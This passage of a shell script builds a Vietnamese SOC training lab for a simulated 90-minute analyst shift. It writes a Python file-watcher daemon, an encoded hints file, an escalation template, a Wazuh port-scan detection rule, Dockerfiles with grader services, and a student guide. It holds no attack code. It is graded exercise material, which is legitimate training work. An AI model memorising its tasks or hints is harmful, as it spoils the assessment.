        return "Con %d phut. Hoan tat phieu; sau ca con ban giao." % max(1, round(dur * 10 / 90))
    if k == "NHAC_90":
        return "HET CA. triage.txt / su-co.txt / leo-thang/ DA DONG BANG. Viet ban-giao.txt, phan-tu.txt, khao-sat (SAU=)."
    return None


def get(path, raw=False):
    with urllib.request.urlopen(SIEM + path, timeout=4) as r:
        b = r.read()
    return b if raw else json.loads(b.decode())


def log(line):
    with open(LOG, "a") as f:
        f.write("%d %s\n" % (int(time.time()), line))


def nhac(text):
    with open(NHAC, "a") as f:
        f.write("[%s] %s\n" % (time.strftime("%H:%M"), text))
    os.chown(NHAC, H.pw_uid, H.pw_gid)


def own(path):
    for root, dirs, files in os.walk(path):
        for n in dirs + files:
            os.chown(os.path.join(root, n), H.pw_uid, H.pw_gid)
    os.chown(path, H.pw_uid, H.pw_gid)


def state():
    st = {"released": [], "first": {}, "val": {}, "mt": {}, "frozen": False}
    p = os.path.join(VAR, "watcher.json")
    if os.path.exists(p):
        try:
            st.update(json.load(open(p)))
        except ValueError:
            pass
    return st


def save(st):
    p = os.path.join(VAR, "watcher.json")
    open(p + ".tmp", "w").write(json.dumps(st))
    os.replace(p + ".tmp", p)


def scan_triage(st):
    p = os.path.join(HOME, "triage.txt")
    try:
        lines = open(p, encoding="utf-8", errors="replace").read().splitlines()
    except OSError:
        return
    last = {}
    for ln in lines:                      # dong CUOI cung cua moi INC la gia tri hien hanh
        m = RE_INC.match(ln)
        if m:
            last[m.group(1)] = m.group(2)
    for inc, val in last.items():
        if inc not in st["first"]:
            st["first"][inc] = int(time.time())
            log("FIRST INC-%s %s" % (inc, val))
        if st["val"].get(inc) != val:
            st["val"][inc] = val
            log("SET INC-%s %s" % (inc, val))


def scan_files(st):
    paths = [os.path.join(HOME, "su-co.txt")]
    d = os.path.join(HOME, "leo-thang")
    if os.path.isdir(d):
        paths += [os.path.join(d, n) for n in sorted(os.listdir(d)) if n.endswith(".txt")]
    for p in paths:
        try:
            h = hashlib.sha1(open(p, "rb").read()).hexdigest()[:10]
        except OSError:
            continue
        if st["mt"].get(p) != h:
            if p in st["mt"]:
                log("EDIT %s %s" % (os.path.relpath(p, HOME), h))
            st["mt"][p] = h


def freeze(st):
    os.makedirs(FROZEN, exist_ok=True)
    for n in ("triage.txt", "su-co.txt"):
        p = os.path.join(HOME, n)
        if os.path.isfile(p):
            shutil.copy(p, os.path.join(FROZEN, n))
    d = os.path.join(HOME, "leo-thang")
    if os.path.isdir(d):
        shutil.copytree(d, os.path.join(FROZEN, "leo-thang"), dirs_exist_ok=True)
    for root, dirs, files in os.walk(FROZEN):
        for n in files:
            os.chmod(os.path.join(root, n), 0o444)
    st["frozen"] = int(time.time())
    log("FROZEN")


def chup_goc():
    """Lan dau (truoc T0): giu ban goc file phieu de reset-ca (phat trien) dua defender ve dau ca."""
    if os.path.isdir(GOC):
        return
    os.makedirs(GOC)
    for n in PHIEU:
        p = os.path.join(HOME, n)
        if os.path.isdir(p):
            shutil.copytree(p, os.path.join(GOC, n))
        elif os.path.isfile(p):
            shutil.copy2(p, os.path.join(GOC, n))


def lam_moi(old):
    """siem chay reset-ca (T0 doi): cat phieu ca cu vao ~/.ca-cu/<T0 cu>/, tra ban goc, bo dong bang."""
    bk = os.path.join(HOME, ".ca-cu", str(old))
    os.makedirs(bk, exist_ok=True)
    co_goc = os.path.isdir(GOC)            # container cu (chua chup goc): chi SAO LUU, giu nguyen phieu
    for n in PHIEU + ("yeu-cau",):
        p = os.path.join(HOME, n)
        if not co_goc and n != "yeu-cau":
            if os.path.isdir(p):
                shutil.copytree(p, os.path.join(bk, n), dirs_exist_ok=True)
            elif os.path.isfile(p):
                shutil.copy2(p, os.path.join(bk, n))
            continue
        if os.path.exists(p):
            shutil.move(p, os.path.join(bk, n))
        g = os.path.join(GOC, n)
        if os.path.isdir(g):
            shutil.copytree(g, p)
        elif os.path.isfile(g):
            shutil.copy2(g, p)
        if os.path.exists(p):
            own(p) if os.path.isdir(p) else os.chown(p, H.pw_uid, H.pw_gid)
    os.makedirs(os.path.join(HOME, "yeu-cau"), exist_ok=True)
    own(os.path.join(HOME, ".ca-cu"))
    shutil.rmtree(FROZEN, ignore_errors=True)
    if os.path.exists(LOG):
        os.replace(LOG, LOG + "." + str(old))
    nhac("(PHAT TRIEN) reset-ca: phieu ca cu -> ~/.ca-cu/%s/ ; bat dau ca moi." % old)


def main():
    os.makedirs(VAR, exist_ok=True)
    os.chmod(VAR, 0o700)
    st = state()
    cho = False
    while True:
        try:
            sh = get("/shift.json")
        except Exception:  # noqa: BLE001
            sh = {}
        if not sh.get("t0"):
            if not st.get("t0"):
                chup_goc()
                if not cho:
                    cho = True
                    nhac("siem dang chuan bi (Wazuh + du lieu ca, ~5-10 phut). Trong luc cho: doc ~/SOP-ca-truc.txt, "
                         "~/ban-giao-ca-truoc.txt, viet ~/ke-hoach.txt. Xem tien do: trang-thai")
            time.sleep(5)
            continue
        try:                                                 # ban cuoi cho trang-thai khi mat lien lac siem
            open(CACHE + ".tmp", "w").write(json.dumps(sh))
            os.chmod(CACHE + ".tmp", 0o644)
            os.replace(CACHE + ".tmp", CACHE)
        except OSError:
            pass
        if st.get("t0") and sh["t0"] != st["t0"]:          # reset-ca tren siem (chi khi phat trien)
            lam_moi(st["t0"])
            st = {"released": [], "first": {}, "val": {}, "mt": {}, "frozen": False}
        if sh.get("t0") and not st.get("t0"):
            st["t0"] = sh["t0"]
            log("T0 %d" % sh["t0"])
            nhac("Ca truc da bat dau. Hang doi tren dashboard (data.ticket:*). SOP: ~/SOP-ca-truc.txt")
        for k in sorted(sh.get("released", {})):
            if k in st["released"]:
                continue
            if k in ("R-A", "R-B"):
                try:
                    d = os.path.join(HOME, "yeu-cau", k)
                    os.makedirs(d, exist_ok=True)
                    for n in ("yeu-cau.txt", "dev.jsonl"):
                        open(os.path.join(d, n), "wb").write(get("/yeu-cau/%s/%s" % (k, n), raw=True))
                    own(os.path.join(HOME, "yeu-cau"))
                    nhac("YEU CAU MOI: ~/yeu-cau/%s/yeu-cau.txt" % k)
                    log("RELEASE %s" % k)
                except Exception:  # noqa: BLE001
                    continue          # thu lai vong sau
            elif msg(k, sh):
                nhac(msg(k, sh))
            st["released"].append(k)
        if not st.get("frozen"):
            scan_triage(st)
            scan_files(st)
            if sh.get("end") and time.time() >= sh["end"]:
                scan_triage(st)
                freeze(st)
        save(st)
        time.sleep(5)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/share/goi-y"
cat > "$LAB/defender/_system/usr/local/share/goi-y/bai18.dat" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
eNp9Vltv4lYQfs+vGPFkusZgyPaB3EScNqBNQhpIq2ov0Yl9FlsYH699TENV9bf3m7G5ZLOqFBGwx3NmvsuMP/pe//PR9fSWZo8UTMkJVU799lGHbkxIK5NQqLKYnpWhsFKUFzrSoYl04cWmtJla6SH9pZ87ZWxysoXJFnjApRJZbKwNPpBikajMOyIKVEg2CZfaIlRnFDzeXdNKbVzKEGUTnVMWq4qcNY7rnFOkLH1NUs3fF4hINUrB96DPn57ntSlVKNJSGFcm8VD1LX7sjuBqFgl/csxzhY64CQnGSRVuoIO6ltvRn/RhPAqG+IkQ+9JRZaltSU6UhDGtK9QfKYqqjbZtWitKzYK7k4zogSI0W/ARyxgdmxVXcz0ZTZ6upqM7ivQKwNQ1fBhP0XdotoU666hu7RtSAcwy1mnq4hfuMTDPpukFLLS9o6OPvjd4w9mAOQukM+lnS8qQZr/d4FrMNIacBdAJqF4e21UqHNfpqzw1Kiq7HPGmHrTvLGMOq6tucxQoy/BwgthsUW0YOoYcGUFRxJeXG447bMXhw/YNuSRZkf4wb4WQqKI00ZVUcXU38yAfOt5itkcvQghUcO+TwzSsqhCBSAvRJSBFZTTqXraZjXn9QGvZFAOes4XhqLrSVo0cZ2El8Bmz34M6kY1ZBSjt13u3IbDh+EZUjr6H5NfAptp05Ep3FviefbEuMUOQtoUxKkGchXBCk2nwBKTOyISWm2L2JvcAj1nuszNvHkdzeuiMDow5jyvpsqYLaoaWUXYe49q6IvDctaiYsRvS7XRChQb+JQyB7LPgYXI/b+CHZB00ibvFpi1ARswfQBG4mNsY/igNIiUhLuAQdiZ7Zyme30ed1FeuHhmdK4j+HYoC/itDfBznvGIVcvGNqXaWQiE7y7lkN7mmUhfrJNRt5uF2OqcyLJLcEh8BkF9LlnPbuOpEW7PLFxWGuizFqZGmF70Sh/JjRSoWrsAIY+cMfL/Xa9eoD75HXax1w7Hwj/hdwl2UsdYp+X2Xbifzh19o7r/vvfd6vcEQciY65WO4lbNWHha63zr/0t0W/PHLxeefPnlOHuf/iA/xqYr2p4vTLp46x4F3Ik102vS9RWpYl82l1Of3pCS5yPp1f3Du98RsUxqeys4HsbVQGlxdgmdoZaVsGD8t9Qb6MozXUEDD6FQ8x0QyVLL1F4KgHMAzAN9hGB4K1IyLAok9hrC2jZxz+jXRacTTF0Uiceu8zp+qLUXzyd2YlfaH+ruKITuuIyEnxYfv+wPhanDgkMsDh9zHPDegyo0Il+GJeC8UiVQKWBcwDfscFQPHjOeFzEZ8u2Dpo5m1SuEa3kHKK4swySUPJtaQBfnq4aazepdwmvxVAReHbLJdZTPuMriQNBbj7gYX4oobefJxviEvYQpGNB5N6r4H3/ctGr1Oqi0H0OfguA+8aonKxpJrPQxgJCshl7aHWQJT/FBPdYJGyCIJoeysJVi0YCqzrPKzloqiAiZ72gmmda5t2OUnym6pTCetqg6/K5SncvH8bcaotLkp7D7n/+bi0INcEXOKmRkCQoYUYWgI7xCCZTC+5tYN/dvlLn9UVsM8B706gkfKDNOa13mmcnf/ItTgKIjxaqj2b0AgEUGsYmAseZ+hv1h7O/m/GEVditV2eEiu7Uqx9fgVA6yNDGzw5hQ6VCksDZ6ZOgy/yooBjlkI8/EjzfH3wBmCw5mFnci7Bi56AToZz+J3vJ3qfYWD1OZEOurIhOD+1nDnCW0gvhC9Tx741jOea2EbW2Nb9TsOtzPmObwZUuDvX8kctllfVjhPTz5A8IvAEQcdI4LtLzf5DB4nL+i2eeQS/8CpbI0tvCxGKRdOcjHEYYSfX2U+2W/XN5v31b71jv4Dufx6kQ==
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/leo-thang"
cat > "$LAB/defender/leo-thang/SC1.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# GHI CHU LEO THANG - su co SC1 (SOP muc 10). CAP NHAT khi chuoi co buoc moi.
TICKET=        # ticket P1 dau tien cua su co (so INC)
HOST=          # may bi anh huong
ASSET_LEVEL=   # 1=Cao 2=TB 3=Thap (theo ctx-assets)
STAGE=         # 1=A dang tac dong  2=B da truy cap  3=C chi thu
MITRE=         # so ky thuat (T1071 -> 1071), nhieu so cach nhau dau phay
IOC_C2=        # octet cuoi IP C2
LIEN_QUAN=     # so ticket KHAC thuoc cung su co
DE_XUAT=       # cac ma 1..8 theo SOP muc 10, cach nhau dau phay
TOM_TAT=       # 2-3 cau: chuyen gi, tu khi nao, bang cach nao, dang o giai doan nao
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/luat"
cat > "$LAB/defender/luat/local_rules.xml" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
<!--
  ~/luat/local_rules.xml - Bai 18. Luat CUA BAN, nap bang:  sudo kiem-thu-luat
  Dai ID:  R-A 100330-100339  |  R-B 100340-100349
  Luat canh bao: level >= 10 va co <mitre>. Ngoai le: luat con level 0, dua tren truong + danh muc co can cu.
  Truong TINH (srcip, dstip, dstport, url, id) dung the rieng (<srcip>, <dstport>, <url>...), KHONG dung <field name="...">.
-->
<group name="bai18,">

  <!-- R-B (dang chay tren san xuat): moi su kien ket noi (netfilter) -> dem. Level 1: khong ghi alerts.json
       nhung VAN dem duoc (Wazuh khong dem tan suat tren luat level 0 nhu 4100). -->
  <rule id="100342" level="1">
    <if_sid>4100</if_sid>
    <description>Su kien ket noi (dem cho R-B)</description>
  </rule>

  <!-- R-B: mot may ket noi toi nhieu dich noi bo trong thoi gian ngan -->
  <rule id="100340" level="10" frequency="8" timeframe="120">
    <if_matched_sid>100342</if_matched_sid>
    <same_srcip />
    <different_dstip />
    <description>Mot may ket noi toi nhieu may noi bo trong thoi gian ngan</description>
    <mitre><id>T1046</id></mitre>
  </rule>

</group>
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/luat/lists"
cat > "$LAB/defender/luat/lists/DOC-TRUOC.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
CDB list cho ngoai le R-B (kiem-thu-luat nap ca 2 file len Wazuh):
  sao-luu-hosts : moi dong 1 IP may nguon,  dang   10.1.2.3:
  sao-luu-ports : moi dong 1 cong,          dang   9102:
Dung trong luat:
  <list field="srcip" lookup="address_match_key">etc/lists/sao-luu-hosts</list>
  <list field="dstport" lookup="match_key">etc/lists/sao-luu-ports</list>
Chi dua vao list nhung gi CO CAN CU (phieu thay doi trong ctx-changes). File rong cung duoc.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/luat/lists"
cat > "$LAB/defender/luat/lists/sao-luu-hosts" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'

__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/luat/lists"
cat > "$LAB/defender/luat/lists/sao-luu-ports" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'

__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/yeu-cau"
cat > "$LAB/defender/yeu-cau/README.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
Yeu cau trong ca (luat khan, bao canh bao) se xuat hien o day khi den luc: ~/yeu-cau/<ma>/yeu-cau.txt + dev.jsonl
Terminal se nhac khi co yeu cau moi. Xem nhanh tinh hinh ca: trang-thai
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-shift-capstone.defender.student" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
# Bai 18: python3 cho watcher + kiem-thu-luat / thu-dong / goi-y / trang-thai (thu vien chuan)
RUN apt-get update || true; apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/*
#
# Mat khau dashboard: moi thanh vien dung anh soc-wazuh rieng -> mat khau khac nhau.
# Lay tu CHINH anh nen ma siem dung (cung tag voi FROM cua siem) -> luon khop khi rebuild lab.
COPY --from=localhost:5000/soc-wazuh:latest /root/wazuh-admin-credentials.txt /tmp/wz-cred.txt
RUN mkdir -p /etc/soc-tools \
 && P=$(sed -n "s/^ *indexer_password: *'\(.*\)' *$/\1/p" /tmp/wz-cred.txt | head -1) \
 && printf 'Wazuh dashboard: https://172.20.0.20\nTai khoan: admin\nMat khau : %s\n' "$P" > /etc/soc-tools/dashboard.txt \
 && chmod 644 /etc/soc-tools/dashboard.txt && rm -f /tmp/wz-cred.txt \
 && test -n "$P"
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
# D4: file he thong cua Bai 18 (defender/_system) thuoc root; bat unit khoa quyen (chay SAU parameterize)
RUN chown -R root:root /usr/local/sbin/bai18-* /usr/local/bin /usr/local/lib/soc-tools /usr/local/share/goi-y /etc/soc-tools /etc/systemd/system/bai18-*.service 2>/dev/null; \
    mkdir -p /etc/systemd/system/multi-user.target.wants \
 && ln -sf /etc/systemd/system/bai18-khoa-quyen.service /etc/systemd/system/multi-user.target.wants/bai18-khoa-quyen.service \
 && ln -sf /etc/systemd/system/bai18-watcher.service /etc/systemd/system/multi-user.target.wants/bai18-watcher.service \
 && chmod 755 /usr/local/bin/kiem-thu-luat /usr/local/bin/thu-dong /usr/local/bin/goi-y /usr/local/bin/trang-thai /usr/local/sbin/bai18-* \
 && chmod 644 /usr/local/lib/soc-tools/*.py /etc/soc-tools/lab.json
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
# D4 (Bai 18): SV KHONG co quyen root - watcher, nhat ky thoi gian va phieu dong bang thuoc root.
# Anh nen cho ubuntu vao nhom sudo (NOPASSWD:ALL); Labtainers can sudo luc khoi dong -> KHONG go o day,
# ma go bang bai18-khoa-quyen.service sau khi /var/labtainer/did_param xuat hien. Sau do chi con soc-tools:
RUN printf '%s\n' \
  'ubuntu ALL=(root) NOPASSWD: /usr/local/sbin/bai18-thu-thap' \
  > /etc/sudoers.d/soc-tools && chmod 440 /etc/sudoers.d/soc-tools
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-shift-capstone.siem.student" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#
# siem (Bai 18) - dung anh nen chung soc-wazuh (Wazuh cai san). TERMINALS 0 (an voi sinh vien).
# Chua: seed18 (nen, ctx-*, ticket), lich-ca (phat su kien theo T0), shiftd (:8088, shift.json cho defender), grade18.
# Boot-hook Labtainers (fixlocal/parameter) BI BO QUA tren anh chung -> khoi tao bang SYSTEMD:
# LUU Y: KHONG chay apply-shared-siem.sh len lab nay nua (file nay da la ban dung anh chung).
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
RUN (command -v python3 >/dev/null 2>&1) || (apt-get update && apt-get install -y --no-install-recommends python3 && rm -rf /var/lib/apt/lists/*) || true
#
# prestop (user ubuntu): chi duoc chay lenh thu thap cua Bai 18 (in dap an + ket qua cham; P3)
RUN printf '%s\n' \
  'ubuntu ALL=(ALL) NOPASSWD: /usr/bin/python3 /home/ubuntu/bai18/grade18.py *' \
  > /etc/sudoers.d/labtainer-bai18 && chmod 440 /etc/sudoers.d/labtainer-bai18
#
# === systemd (P3): seed18 (1 lan) -> lich-ca (lien tuc) + shiftd (:8088) ; grade18 khi luat doi ===
RUN mkdir -p /srv/shiftd /etc/systemd/system/multi-user.target.wants \
 && printf '%s\n' '[Unit]' 'Description=Bai 18 - seed (nen, ctx, Wazuh, tap an) + dat T0' \
   'After=wazuh-manager.service wazuh-indexer.service wazuh-dashboard.service network-online.target' \
   'Wants=wazuh-manager.service' '[Service]' 'Type=oneshot' 'RemainAfterExit=yes' 'TimeoutStartSec=2400' \
   'ExecStart=/usr/bin/python3 /home/ubuntu/bai18/seed18.py' \
   '[Install]' 'WantedBy=multi-user.target' > /etc/systemd/system/seed-bai18.service \
 && printf '%s\n' '[Unit]' 'Description=Bai 18 - lich ca truc (phat su kien theo T0)' 'After=seed-bai18.service' \
   '[Service]' 'ExecStart=/usr/bin/python3 /home/ubuntu/bai18/lich-ca.py' 'Restart=always' 'RestartSec=5' \
   '[Install]' 'WantedBy=multi-user.target' > /etc/systemd/system/lich-ca.service \
 && printf '%s\n' '[Unit]' 'Description=Bai 18 - shiftd: shift.json + yeu cau cho defender (:8088, KHONG dap an)' \
   'After=network-online.target' '[Service]' 'ExecStart=/usr/bin/python3 -m http.server 8088 --directory /srv/shiftd' \
   'Restart=always' 'RestartSec=5' '[Install]' 'WantedBy=multi-user.target' > /etc/systemd/system/shiftd.service \
 && printf '%s\n' '[Unit]' 'Description=Bai 18 - cham lai luat khi local_rules.xml doi' '[Path]' \
   'PathChanged=/var/ossec/etc/rules/local_rules.xml' 'Unit=grade-bai18.service' '[Install]' 'WantedBy=multi-user.target' \
   > /etc/systemd/system/grade-bai18.path \
 && printf '%s\n' '[Unit]' 'Description=Bai 18 - phat lai tap an R-A/R-B' 'After=seed-bai18.service' '[Service]' 'Type=oneshot' \
   'TimeoutStartSec=600' 'ExecStart=/usr/bin/python3 /home/ubuntu/bai18/grade18.py rules 20' 'ExecStartPost=-/usr/bin/python3 /home/ubuntu/bai18/grade18.py print --cache' > /etc/systemd/system/grade-bai18.service \
 && for u in seed-bai18.service lich-ca.service shiftd.service grade-bai18.path; do \
      ln -sf /etc/systemd/system/$u /etc/systemd/system/multi-user.target.wants/$u; done
#
# === Thoi gian cho cua systemd tren VM cham (bai hoc Lab 17) ===
RUN mkdir -p /etc/systemd/system/wazuh-manager.service.d /etc/systemd/system/wazuh-indexer.service.d /etc/systemd/system/wazuh-dashboard.service.d \
 && printf '[Service]\nTimeoutStartSec=600\n' > /etc/systemd/system/wazuh-manager.service.d/bai18-timeout.conf \
 && printf '[Service]\nTimeoutStartSec=900\n' > /etc/systemd/system/wazuh-indexer.service.d/bai18-timeout.conf \
 && printf '[Unit]\nAfter=wazuh-indexer.service\n[Service]\nRestart=on-failure\nRestartSec=30\n' > /etc/systemd/system/wazuh-dashboard.service.d/bai18-order.conf
#
# === Dong bo mui gio voi VM (ICT = UTC+7) ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Entrypoint: khoi phuc quyen cac user Wazuh truoc systemd; don trang thai agent cu ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
RUN mkdir -p /home/$user_name/.local && echo "soc-shift-capstone" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
# entrypoint nhanh: anh chung chown -R ca cay indexer/dashboard moi lan start -> overlayfs copy-up vai GB
# (~5 phut + ton dia o container moi). /usr/share/<u> (JDK, plugin, node_modules: CHI DOC) -> chi chown file
# SAI chu (find doc metadata, khong copy-up). Thu muc DU LIEU/cau hinh van chown -R de copy-up TRUOC khi
# indexer chay: neu node.lock copy-up giua chung, Lucene bao "Underlying file changed by an external force"
# va indexer chet (da gap tren VM 26/11).
# TODO nhom: sua luon trong anh soc-wazuh roi bo khoi nay.
RUN printf '%s\n' '#!/bin/bash' \
   'for u in wazuh-indexer wazuh-dashboard; do' \
   '  id "$u" >/dev/null 2>&1 || continue' \
   '  [ -e /usr/share/$u ] && find /usr/share/$u ! -user "$u" -exec chown -h "$u:$u" {} + 2>/dev/null' \
   '  chown -R "$u:$u" /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
   'done' \
   'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
   'exec /sbin/init --log-target=journal 3>&1' > /entrypoint.sh && chmod 755 /entrypoint.sh
CMD ["/entrypoint.sh"]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
================================================================================
 SOC LAB - BAI 18: CA TRUC MO PHONG (CAPSTONE) (soc-shift-capstone)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
Dem nay ban la analyst Tier 1 DUY NHAT cua SOC Cong ty X trong mot ca truc 90 phut.
Khong ai giao tung bai nho: viec den theo thoi gian thuc, dan xen nhau, va ban phai tu
quyet dinh lam gi truoc, lam gi sau - dung nhu mot ca truc that.

Trong ca se co:
  - hang doi ticket den theo nhieu dot (moi ticket can verdict, uu tien, bang chung);
  - mot so ticket la CAC BUOC cua cung mot chuoi tan cong, rai rac theo thoi gian;
  - yeu cau luat khan tu doi IR (co han chot);
  - mot dot "bao" canh bao lam ngap dashboard.
Het ca, phieu cua ban DONG BANG va ban viet ban giao cho ca sau.

Bai nay tong hop Bai 14-17: triage theo SOP, pivot ngu canh, gom su co + leo thang,
viet/tinh chinh luat Wazuh co kiem chung. Moi sinh vien co so ticket, may, IP, tai
khoan, gio phat va tap kiem tra luat KHAC NHAU.

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
Sau bai nay, ban co the:
  - Van hanh mot ca truc theo SOP: xep thu tu uu tien giua cac LOAI viec dang dien ra.
  - Triage dung va du nhanh duoi ap luc thoi gian (verdict, uu tien, bang chung).
  - Nhan ra cac ticket roi rac thuoc cung mot chuoi tan cong, gom thanh su co, leo thang.
  - Trien khai luat khan "du tot" dung han, roi tinh chinh.
  - Xu ly bao canh bao ma KHONG lam mu SIEM (ngoai le co can cu, khong tat luat).
  - Viet ban giao ca cho nguoi khong o trong ca.

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* SOP ca truc (~/SOP-ca-truc.txt) la "luat choi" cua bai: muc tieu thoi gian, thu tu uu
  tien giua cac loai viec, dinh nghia verdict, ma tran uu tien, dinh dang moi phieu.
  DOC KY TRUOC KHI CA BAT DAU.
* Mot su co that hiem khi nam trong MOT ticket. Ghep cac ticket theo may, IP, thoi gian
  va loai hanh vi; ticket giong mot buoc cua chuoi nhung o may khac, khong lien he
  -> khong gom.
* Bao canh bao: vua ngap dashboard, vua co the CHE mot tan cong that. Ngoai le phai hep
  (dung may nguon VA dung hanh vi) va co can cu (phieu thay doi, dich vu da duyet).
* Wazuh: luat con level 0 lam ngoai le, CDB list (lookup), luat tan suat, pcre2, MITRE.
* "Du tot truoc, hoan hao sau": mot luat bat duoc phan lon trong han tot hon luat hoan
  hao tre han.

4. MOI TRUONG (TOPOLOGY)
--------------------------------------------------------------------------------
  siem     (172.20.0.20, AN)  Wazuh + lich ca truc. Ban KHONG co terminal tren may nay.
  defender (172.20.0.30)      tram cua ban: Firefox + terminal. Ban KHONG co quyen root.

  Dashboard:  https://172.20.0.20  -  tai khoan admin
              mat khau: chay   cat /etc/soc-tools/dashboard.txt   tren defender
  Hang doi :  Discover, index wazuh-alerts-*, truy van  data.ticket:*
              (dat khung thoi gian du rong, bat auto-refresh 30s suot ca)
  Ngu canh :  index pattern ctx-*  (tai san, dich vu da duyet, phieu thay doi, nhan su)
  MAY cua mot su kien = truong predecoder.hostname (agent luon la "siem").

5. CONG CU TREN DEFENDER
--------------------------------------------------------------------------------
  trang-thai               tinh hinh ca: phut thu may, ticket nao chua co dong phieu,
                           yeu cau dang mo + han, so luat trong file. KHONG cho biet dung/sai.
  kiem-thu-luat            nap ~/luat/local_rules.xml + ~/luat/lists/* vao Wazuh,
                           phat lai tap phat trien kem yeu cau, in precision/recall.
                           Luat dang nap sau lan chay CUOI chinh la bai nop.
  thu-dong "<dong log>"    chay 1 dong log qua Wazuh voi luat dang nap (decoder, truong, luat no).
  goi-y <muc>              goi y 3 cap (co ghi nhat ky so lan dung).

6. TIEN TRINH (BEFORE / DURING / AFTER)
--------------------------------------------------------------------------------
TRUOC CA (sau khi mo lab, siem can ~5-10 phut de chuan bi; trang-thai cho biet tien do):
  1) cat /etc/soc-tools/dashboard.txt ; mo dashboard, tao san tim kiem data.ticket:*
  2) Doc ~/SOP-ca-truc.txt va ~/ban-giao-ca-truoc.txt.
  3) Viet ~/ke-hoach.txt (ban se chia thoi gian the nao), dien TRUOC= trong ~/khao-sat.txt.
  Ca TU BAT DAU khi siem san sang - terminal se bao "Ca truc da bat dau".

TRONG CA (90 phut):
  - Moi ticket: 1 dong trong ~/triage.txt  INC-xxx=<V>,<P>,<E>   (SOP muc 5-8).
    Ghi lai dong de sua - dong CUOI cua moi ticket duoc tinh. Gio ghi dong DAU duoc do.
  - Su co (nhieu ticket cung chuoi): ~/su-co.txt  (SOP muc 9).
